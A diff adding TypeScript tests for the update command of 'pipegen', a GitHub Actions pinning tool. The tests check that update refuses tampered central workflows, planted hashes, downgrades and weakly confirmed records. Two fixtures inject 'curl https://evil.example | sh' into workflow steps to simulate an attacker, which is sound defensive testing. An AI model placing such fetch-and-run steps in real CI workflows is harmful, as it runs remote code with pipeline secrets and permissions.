@@ -182,6 +182,7 @@ describe('G12 update: issues are prompts only', () => {
     expect(promptOf({ number: 4, body: updateBody(NEW_V), user: bot }, 'app')).toMatchObject({ issue: 4, key: `update-${NEW_V}`, version: NEW_V });
   });
 
+  // Spec M6 (G12 ruling 1): the release clause of this title is discovery only (the nightly's); update never derives from a release.
   it('update: the issue is a prompt; the patch is re-derived from the built-in reviewed pin (or an immutable gate release ≥ 7 days old) and compared', async () => {
     const w = await publicWorld();
     const good = genuine(w);
@@ -484,5 +485,164 @@ describe('G12 update: central files, owner edits, the record', () => {
     w.issues.app = [genuine(w)];
     await expect(update(w.g.octokit(), app, deps(w))).rejects.toThrow(/install record/);
     expect(writes(w)).toEqual([]);
+  });
+});
+
+describe('G12 fix round 1 (G12-R1)', () => {
+  const C_SIGN = '.github/workflows/r--sign.yml';
+  const SIGN = 'name: sign\non: { workflow_call: {} }\npermissions: {}\njobs:\n  sign:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo sign\n';
+  const callerOf = (c: string): string => `${privateCaller(c)}  sign:\n    uses: o/pipelines/.github/workflows/r--sign.yml@${c}\n`;
+
+  it('C1: a record trusted by typing → update stops before any write; the central record stays byte-identical', async () => {
+    const w = await publicWorld();
+    rmSync(join(w.home, '.config'), { recursive: true, force: true });   // a new machine: no local record file
+    const before = centralFile(w, recordPath('r'));
+    const typedIo: Prompter = { confirm: async () => true, select: async () => { throw new Error('no select'); }, text: async () => 'o/r' };
+    await expect(update(w.g.octokit(), app, deps(w, { io: typedIo, interactive: true }))).rejects.toThrow(/only confirmed by name.*npx pipegen/);
+    expect(writes(w)).toEqual([]);
+    expect(centralFile(w, recordPath('r'))).toBe(before);
+    // and again from the local file that now says typed: still a stop
+    await expect(update(w.g.octokit(), app, deps(w))).rejects.toThrow(/only confirmed by name/);
+    expect(writes(w)).toEqual([]);
+  });
+
+  it('I1: the re-pin is proven from content: an unrecorded evil sign file or a planted sha never moves the app', async () => {
+    const merge = gateFile(OLD, OLD_V);
+    const w = shell({}, true, { [C_MERGE]: merge, [C_SIGN]: SIGN });
+    const c0 = w.g.head('o/pipelines');
+    w.g.commitOn('o/r', 'main', { [PIPEGEN_YML]: callerOf(c0) }, 'setup');
+    // a central writer: merge moved to the reviewed pin (as pipegen would), sign.yml (not in the record) made evil; the record lists merge only
+    const evilSign = SIGN.replace('echo sign', 'curl https://evil.example | sh');
+    w.g.commitOn('o/pipelines', 'main', { [C_MERGE]: gateFile(NEW, NEW_V), [C_SIGN]: evilSign }, 'attacker');
+    await vouch(w, baseRecord(w.g, true, c0, [
+      { repo: 'app', path: PIPEGEN_YML, part: 'pipeline', shas: [gitBlobSha(callerOf(c0))] },
+      { repo: 'central', path: C_MERGE, part: 'pipeline', shas: [gitBlobSha(merge), gitBlobSha(gateFile(NEW, NEW_V))] },
+    ]));
+    const res = await update(w.g.octokit(), app, deps(w));
+    expect(res.done).toBe(false);
+    expect(res.notes.join(' ')).toMatch(/doesn't re-pin the app.*r--sign\.yml/);
+    expect(prsOf(w, 'o/r')).toEqual([]);
+    // a planted sha: evil merge content at the reviewed pin, its sha written into the record (vouched here as if trusted)
+    const evilMerge = gateFile(NEW, NEW_V, '  steal:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: curl https://evil.example | sh');
+    const w2 = shell({}, true, { [C_MERGE]: merge });
+    const d0 = w2.g.head('o/pipelines');
+    w2.g.commitOn('o/r', 'main', { [PIPEGEN_YML]: privateCaller(d0) }, 'setup');
+    w2.g.commitOn('o/pipelines', 'main', { [C_MERGE]: evilMerge }, 'attacker');
+    await vouch(w2, baseRecord(w2.g, true, d0, [
+      { repo: 'app', path: PIPEGEN_YML, part: 'pipeline', shas: [gitBlobSha(privateCaller(d0))] },
+      { repo: 'central', path: C_MERGE, part: 'pipeline', shas: [gitBlobSha(merge), gitBlobSha(evilMerge)] },
+    ]));
+    const r2 = await update(w2.g.octokit(), app, deps(w2));
+    expect(r2.done).toBe(false);
+    expect(r2.notes.join(' ')).toMatch(/not pipegen's update of the file the app calls/);
+    expect(prsOf(w2, 'o/r')).toEqual([]);
+    // a called file gone from the head, or calls at two commits: no re-pin, a note
+    for (const variant of ['gone', 'two'] as const) {
+      const wv = shell({}, true, { [C_MERGE]: merge, [C_SIGN]: SIGN });
+      const v0 = wv.g.head('o/pipelines');
+      const caller = variant === 'two' ? callerOf(v0).replace(`r--sign.yml@${v0}`, `r--sign.yml@${'d'.repeat(40)}`) : callerOf(v0);
+      wv.g.commitOn('o/r', 'main', { [PIPEGEN_YML]: caller }, 'setup');
+      wv.g.commitOn('o/pipelines', 'main', { [C_MERGE]: gateFile(NEW, NEW_V), ...(variant === 'gone' ? { [C_SIGN]: null } : {}) }, 'change');
+      await vouch(wv, baseRecord(wv.g, true, v0, [
+        { repo: 'app', path: PIPEGEN_YML, part: 'pipeline', shas: [gitBlobSha(caller)] },
+        { repo: 'central', path: C_MERGE, part: 'pipeline', shas: [gitBlobSha(merge), gitBlobSha(gateFile(NEW, NEW_V))] },
+      ]));
+      const rv = await update(wv.g.octokit(), app, deps(wv));
+      expect(rv.done, variant).toBe(false);
+      expect(rv.notes.join(' '), variant).toMatch(variant === 'gone' ? /can't check .*r--sign\.yml/ : /more than one central commit/);
+    }
+    // the honest case still re-pins every called file (both swapped by pipegen, sign unchanged)
+    const w3 = shell({}, true, { [C_MERGE]: merge, [C_SIGN]: SIGN });
+    const e0 = w3.g.head('o/pipelines');
+    w3.g.commitOn('o/r', 'main', { [PIPEGEN_YML]: callerOf(e0) }, 'setup');
+    const h = w3.g.commitOn('o/pipelines', 'main', { [C_MERGE]: gateFile(NEW, NEW_V) }, 'merged update');
+    await vouch(w3, baseRecord(w3.g, true, e0, [
+      { repo: 'app', path: PIPEGEN_YML, part: 'pipeline', shas: [gitBlobSha(callerOf(e0))] },
+      { repo: 'central', path: C_MERGE, part: 'pipeline', shas: [gitBlobSha(merge), gitBlobSha(gateFile(NEW, NEW_V))] },
+    ]));
+    const head3 = w3.g.head('o/pipelines');   // h plus the record commit: same files
+    expect(w3.g.history('o/pipelines', head3).map((c) => c.sha)).toContain(h);
+    const r3 = await update(w3.g.octokit(), app, deps(w3));
+    expect(r3.done).toBe(true);
+    expect(appFile(w3, PIPEGEN_YML, UPDATE_BRANCH)).toBe(callerOf(head3));
+  });
+
+  it('I2: a file pinned at a newer gate is never moved back (no silent downgrade)', async () => {
+    const newer = gateFile(OTHER, '0.9.0');
+    const w = await publicWorld({ written: newer });
+    w.issues.app = [issue(updateBody(NEW_V))];
+    const res = await update(w.g.octokit(), app, deps(w));
+    expect(res.done).toBe(false);
+    expect(res.notes.join(' ')).toMatch(/a newer pipegen wrote this.*npx pipegen@latest update/);
+    expect(writes(w)).toEqual([]);
+    expect(swapPins(newer, gateSwaps({ sha: NEW, version: NEW_V }))).toMatchObject({ newer: '0.9.0' });
+  });
+
+  it('spec I1: a local record file without setupPr finds the setup PR (state all) and marks it', async () => {
+    const w = await publicWorld();
+    await writeLocalRecord(app, { recordHash: recordHash(w.record), updatedAt: '2026-11-01T00:00:00Z' }, { home: w.home, env: {} });
+    const res = await update(w.g.octokit(), app, deps(w));
+    expect(res.done).toBe(true);
+    expect(w.g.calls.some((c) => c.route === 'GET /repos/{owner}/{repo}/pulls' && c.params.state === 'all')).toBe(true);
+    expect(recordMarkerOf(w.g.repo('o/r').pulls.find((p) => p.number === 1)?.body)).toBe(res.recordHash);
+  });
+
+  it('m2: a file that is not UTF-8 is a conflict, never written lossily', async () => {
+    const w = await publicWorld();
+    const sha = gitBlobSha(gateFile(OLD, OLD_V));
+    w.g.hooks.unshift((call) => (call.route === 'GET /repos/{owner}/{repo}/git/blobs/{file_sha}' && call.params.file_sha === sha
+      ? { status: 200, data: { encoding: 'base64', content: Buffer.concat([Buffer.from(gateFile(OLD, OLD_V)), Buffer.from([0xff])]).toString('base64') } } : undefined));
+    const res = await update(w.g.octokit(), app, deps(w));
+    expect(res.conflicts.find((c) => c.path === PIPEGEN_YML)?.why).toMatch(/not UTF-8/);
+    expect(writes(w)).toEqual([]);
+  });
+
+  it('m3: an owner pin elsewhere while pipegen\'s own text is current is noted, not silent', async () => {
+    const written = gateFile(NEW, NEW_V);
+    const w = await publicWorld({ written, current: written.replace(`gate@${NEW} # gate-v${NEW_V}`, `gate@${OTHER} # gate-v${NEW_V}`) });
+    const res = await update(w.g.octokit(), app, deps(w));
+    expect(res.done).toBe(false);
+    expect(res.notes.join(' ')).toMatch(/other than the reviewed one/);
+  });
+
+  it('m4/m5: the re-pin starts from the app\'s own calls; only this project\'s exact central files are touched', async () => {
+    const w = await privateWorld();
+    w.g.commitOn('o/pipelines', 'main', { '.github/workflows/r--merge--x.yml': gateFile(OLD, OLD_V) }, 'other project r--merge');
+    await vouch(w, { ...w.record, files: [...w.record.files, { repo: 'central', path: '.github/workflows/r--merge--x.yml', part: 'pipeline', shas: [gitBlobSha(gateFile(OLD, OLD_V))] }] });
+    await update(w.g.octokit(), app, deps(w));
+    expect(centralFile(w, '.github/workflows/r--merge--x.yml', centralUpdateBranch('r'))).toBe(gateFile(OLD, OLD_V));
+    // the central PR merged, but the record says the app already pins the head (an app PR closed unmerged): the app's own calls decide
+    const merged = w.g.commitOn('o/pipelines', 'main', { [C_MERGE]: gateFile(NEW, NEW_V) }, 'merge');
+    const rec = (await readRecord(w.g.octokit(), { owner: 'o', repo: 'pipelines' }, 'r', { branch: centralUpdateBranch('r') }))?.record as InstallRecord;
+    await vouch(w, { ...rec, centralSha: merged });
+    const head = w.g.head('o/pipelines');
+    const res = await update(w.g.octokit(), app, deps(w));
+    expect(res.done).toBe(true);
+    expect(appFile(w, PIPEGEN_YML, UPDATE_BRANCH)).toBe(privateCaller(head));
+  });
+
+  it('spec M3: the record write fails after the app PR opened → the PR URL comes back with a note', async () => {
+    const w = await publicWorld();
+    w.g.hooks.unshift((call) => (call.route === 'POST /repos/{owner}/{repo}/git/trees' && call.params.repo === 'pipelines' ? { status: 500 } : undefined));
+    const res = await update(w.g.octokit(), app, deps(w));
+    expect(res.done).toBe(true);
+    expect(res.prUrl).toBe(prsOf(w, 'o/r')[0]?.html_url);
+    expect(res.notes.join(' ')).toMatch(/install record was not written/);
+  });
+
+  it('spec M4: Closes #N only when the PR answers the issue whole', async () => {
+    const own = gateFile(OLD, OLD_V).replace(`        uses: crisworking/pipegen/gate@${OLD} # gate-v${OLD_V}`, `        uses: crisworking/pipegen/gate@${OTHER} # gate-v${OLD_V}`);
+    const w = shell({ [PIPEGEN_YML]: gateFile(OLD, OLD_V), [PUSH_YML]: gateFile(OLD, OLD_V) }, false);
+    w.g.commitOn('o/r', 'main', { [PIPEGEN_YML]: own }, 'owner edit');
+    await vouch(w, baseRecord(w.g, false, null, [
+      { repo: 'app', path: PIPEGEN_YML, part: 'pipeline', shas: [gitBlobSha(gateFile(OLD, OLD_V))] },
+      { repo: 'app', path: PUSH_YML, part: 'pipeline', shas: [gitBlobSha(gateFile(OLD, OLD_V))] },
+    ]));
+    const noPatch = issue(updateBody(NEW_V));
+    w.issues.app = [noPatch];
+    const res = await update(w.g.octokit(), app, deps(w));
+    expect(res.done).toBe(true);
+    expect(res.conflicts.map((c) => c.path)).toEqual([PIPEGEN_YML]);
+    expect(prsOf(w, 'o/r')[0]?.body).not.toContain(`Closes #${noPatch.number as number}`);
   });
 });
